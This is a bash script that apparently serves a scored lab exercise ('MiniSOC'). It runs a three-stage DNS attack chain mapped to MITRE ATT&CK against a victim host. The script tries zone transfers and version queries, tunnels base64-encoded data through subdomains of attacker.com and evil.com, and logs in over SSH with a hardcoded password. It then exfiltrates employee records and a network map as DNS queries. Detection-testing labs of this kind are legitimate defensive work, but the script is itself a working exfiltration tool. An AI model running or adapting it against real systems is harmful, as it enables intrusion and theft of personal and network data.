#!/bin/bash
###############################################################################
# VECTOR 3: DNS Tunneling & Exfiltration
# Kill Chain: DNS Recon → DNS Tunneling → Data Exfiltration via DNS
# MITRE ATT&CK: T1018 → T1572 → T1048.003
###############################################################################
set -uo pipefail

VICTIM="${VICTIM_HOST:-victim}"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
fail() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }

TOTAL_POINTS=0
report_stage() {
    local stage="$1" mitre="$2" tactic="$3" points="$4" status="$5"
    TOTAL_POINTS=$((TOTAL_POINTS + points))
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  Stage: ${YELLOW}${stage}${NC}"
    echo -e "  MITRE: ${mitre} (${tactic})"
    echo -e "  Status: ${status}  |  Points: +${points}  |  Total: ${TOTAL_POINTS}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║        VECTOR 3: DNS TUNNELING & EXFILTRATION            ║${NC}"
echo -e "${RED}║  Recon → Tunnel → Exfiltrate                             ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

###############################################################################
# STAGE 1: DNS Reconnaissance (T1018 - Remote System Discovery)
###############################################################################
info "Stage 1: DNS Reconnaissance"
log "Querying DNS server on ${VICTIM}..."

log "ANY record query..."
DIG_ANY=$(dig @"$VICTIM" minisoc.local ANY 2>/dev/null || true)
echo "$DIG_ANY" | head -15

log "Zone transfer attempt (AXFR)..."
DIG_AXFR=$(dig @"$VICTIM" minisoc.local AXFR 2>/dev/null || true)
echo "$DIG_AXFR" | head -15

log "Reverse lookup..."
NSLOOKUP_OUT=$(nslookup "$VICTIM" "$VICTIM" 2>/dev/null || true)
echo "$NSLOOKUP_OUT"

log "Version query (chaos class)..."
DIG_VER=$(dig @"$VICTIM" version.bind chaos txt 2>/dev/null || true)
echo "$DIG_VER" | grep -v "^;" | head -5

report_stage "DNS Reconnaissance" "T1018" "Discovery" 10 "${GREEN}SUCCESS${NC}"

sleep 2

###############################################################################
# STAGE 2: DNS Tunneling Setup (T1572 - Protocol Tunneling)
###############################################################################
info "Stage 2: DNS Tunneling"
log "Simulating DNS tunnel — encoding data in subdomain queries..."

# Simulate encoding data chunks as DNS queries
CHUNKS=(
    "$(echo 'hostname=victim' | base64 | tr -d '=')"
    "$(echo 'os=linux' | base64 | tr -d '=')"
    "$(echo 'user=www-data' | base64 | tr -d '=')"
    "$(echo 'ip=172.20.0.0' | base64 | tr -d '=')"
    "$(echo 'status=compromised' | base64 | tr -d '=')"
)

QUERY_COUNT=0
for chunk in "${CHUNKS[@]}"; do
    QUERY="${chunk}.tunnel.attacker.com"
    log "  DNS query: ${QUERY}"
    dig @"$VICTIM" "$QUERY" +short 2>/dev/null || true
    QUERY_COUNT=$((QUERY_COUNT + 1))
done

# High-volume burst to trigger detection
log "Sending burst of encoded queries (triggering volume detection)..."
for i in $(seq 1 15); do
    DATA="$(echo "secret-data-chunk-${i}" | base64 | tr -d '=')"
    dig @"$VICTIM" "${DATA}.exfil.attacker.com" +short 2>/dev/null &
done
wait
QUERY_COUNT=$((QUERY_COUNT + 15))

ok "Sent ${QUERY_COUNT} tunneled DNS queries"
report_stage "DNS Tunneling" "T1572" "Command and Control" 25 "${GREEN}SUCCESS${NC}"

sleep 2

###############################################################################
# STAGE 3: Data Exfiltration via DNS (T1048.003 - Exfil Over Unencrypted Protocol)
###############################################################################
info "Stage 3: Data Exfiltration via DNS"
log "Accessing victim to extract sensitive data..."

do_ssh_victim() {
    sshpass -p "password123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null victim@"$VICTIM" "$@" 2>/dev/null
}

log "Reading employee records from victim..."
EMP_DATA=$(do_ssh_victim 'cat /home/victim/sensitive_data/employee_records.csv 2>/dev/null')

if [ -n "$EMP_DATA" ]; then
    ok "Retrieved employee data ($(echo "$EMP_DATA" | wc -l) lines)"
    
    log "Encoding and exfiltrating via DNS queries..."
    EXFIL_COUNT=0
    echo "$EMP_DATA" | head -10 | while IFS= read -r line; do
        ENCODED=$(echo "$line" | base64 | tr -d '=' | tr '+/' '-_' | fold -w 60 | head -1)
        dig @"$VICTIM" "${ENCODED}.exfil.evil.com" +short 2>/dev/null || true
        EXFIL_COUNT=$((EXFIL_COUNT + 1))
    done
    
    ok "Exfiltrated data via $(echo "$EMP_DATA" | head -10 | wc -l) DNS queries"
    
    log "Exfiltrating network map..."
    NET_DATA=$(do_ssh_victim 'cat /home/victim/sensitive_data/network_map.txt 2>/dev/null')
    if [ -n "$NET_DATA" ]; then
        echo "$NET_DATA" | head -5 | while IFS= read -r line; do
            ENCODED=$(echo "$line" | base64 | tr -d '=' | tr '+/' '-_' | fold -w 60 | head -1)
            dig @"$VICTIM" "${ENCODED}.net.evil.com" +short 2>/dev/null || true
        done
        ok "Network map exfiltrated"
    fi
    
    report_stage "DNS Data Exfiltration" "T1048.003" "Exfiltration" 35 "${GREEN}SUCCESS${NC}"
else
    fail "Could not access victim data via SSH"
    
    log "Falling back to simulated exfiltration..."
    for i in $(seq 1 10); do
        FAKE=$(echo "simulated-secret-record-${i}" | base64 | tr -d '=')
        dig @"$VICTIM" "${FAKE}.exfil.evil.com" +short 2>/dev/null || true
    done
    
    report_stage "DNS Data Exfiltration" "T1048.003" "Exfiltration" 15 "${YELLOW}PARTIAL${NC}"
fi

###############################################################################
# SUMMARY
###############################################################################
echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                 ATTACK CHAIN COMPLETE                     ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║${NC}  Vector:     DNS Tunneling & Exfiltration               ${RED}║${NC}"
echo -e "${RED}║${NC}  Stages:     3/3 executed                                ${RED}║${NC}"
echo -e "${RED}║${NC}  Total Score: ${GREEN}${TOTAL_POINTS} points${NC}                              ${RED}║${NC}"
echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
echo -e "${RED}║${NC}  MITRE ATT&CK Techniques:                               ${RED}║${NC}"
echo -e "${RED}║${NC}    T1018      Remote System Discovery  (Discovery)       ${RED}║${NC}"
echo -e "${RED}║${NC}    T1572      Protocol Tunneling       (C2)              ${RED}║${NC}"
echo -e "${RED}║${NC}    T1048.003  Exfil Over Unencrypted   (Exfiltration)    ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"
